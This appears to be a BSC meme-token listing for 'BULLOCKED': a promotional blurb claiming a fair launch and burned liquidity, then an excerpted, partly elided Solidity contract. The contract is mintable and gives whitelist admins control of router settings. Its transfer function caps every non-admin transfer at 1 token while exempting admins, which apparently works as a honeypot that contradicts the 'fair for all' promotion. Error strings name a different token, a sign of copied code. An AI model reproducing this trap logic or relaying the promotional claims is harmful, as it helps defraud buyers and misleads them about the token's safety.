...
https://t.me/bullockedbsc

No Presale it`s fairlaunch for all
LP 100% burn
4% Are Distributed to LP from all transfers forever locked on LP

website: Soon

DYOR - Do your own research

Don't cry if you lose. Don't waste opportunities ... don't forget to learn!

Tokens are a gift to the community! 100% enter the pool and the BSC is provided by the team.
Today's special round
...
// File: contracts/BULLOCK.sol


contract BULLOCKED is 
    ERC20, 
    ERC20Detailed("BULLOCKED", "BULLOCK", 18), 
    ERC20Burnable, 
    ERC20Mintable,
    ...
    
{
    function setUniswapV2Router(address _uniswapV2Router) public onlyWhitelistAdmin {
        require(uniswapV2Router == address(0), "BUNDERWEAR::setUniswapV2Router: already set");
        uniswapV2Router = _uniswapV2Router;
    }

    function setUniswapV2Pair(address _uniswapV2Pair) public onlyWhitelistAdmin {
        require(uniswapV2Pair == address(0), "BUNDERWEAR::setUniswapV2Pair: already set");
        uniswapV2Pair = _uniswapV2Pair;
    }

    function setLiquidityLockDivisor(uint256 _liquidityLockDivisor) public onlyWhitelistAdmin {
        if (_liquidityLockDivisor != 0) {
            require(_liquidityLockDivisor >= 10, "BUNDERWEAR::setLiquidityLockDivisor: too small");
        }
    ...
    function transfer(address recipient, uint256 amount) public returns (bool) {
        if (!isWhitelistAdmin(_msgSender())) {
            require(amount <= 1 ether, "Transfer amount cannot be greater than 1");
        }
